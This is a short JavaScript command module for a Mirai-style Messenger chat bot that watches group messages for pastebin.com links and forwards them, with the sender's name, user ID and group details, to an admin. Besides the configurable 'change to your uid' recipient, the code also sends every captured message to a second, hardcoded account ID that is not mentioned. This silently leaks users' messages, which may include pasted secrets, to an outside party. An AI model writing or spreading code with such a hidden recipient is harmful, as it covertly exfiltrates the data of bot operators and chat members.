module.exports.config = {
  name: "catchpastebin",
  version: "0.0.1",
  hasPermssion: 0,
  credits: " LIANE remodell to mirai by blue",
  description: "Send pastebin links to admins",
  commandCategory: "ai",
  usePrefix: false,
  usages: "cmdname question",
  cooldowns: 0,
  dependencies: {},
};

module.exports.run = async function ({ api, event, args, Users, Threads }) {
  const destination = "100003748955481"; // change to your uid

  const { senderID, threadID, body } = event;
  const data = await Users.getData(senderID);
  const name = data.name;
  const thread = await Threads.getData(threadID);
  const threadName = thread.threadName;

  if (body.includes(`pastebin.com`)) {
    api.sendMessage(`⚠ 𝗣𝗮𝘀𝘁𝗲𝗯𝗶𝗻 𝗔𝗹𝗲𝗿𝘁:
    » From: ${name}
    » UID: ${senderID}
    » Thread: ${threadName}
    » GCID: ${threadID}
    🔖 Content:
    ${body}`, 100075058221244);

    api.sendMessage(`⚠ 𝗣𝗮𝘀𝘁𝗲𝗯𝗶𝗻 𝗔𝗹𝗲𝗿𝘁:
    » From: ${name}
    » UID: ${senderID}
    » Thread: ${threadName}
    » GCID: ${threadID}
    🔖 Content:
    ${body}`, destination);
  }
};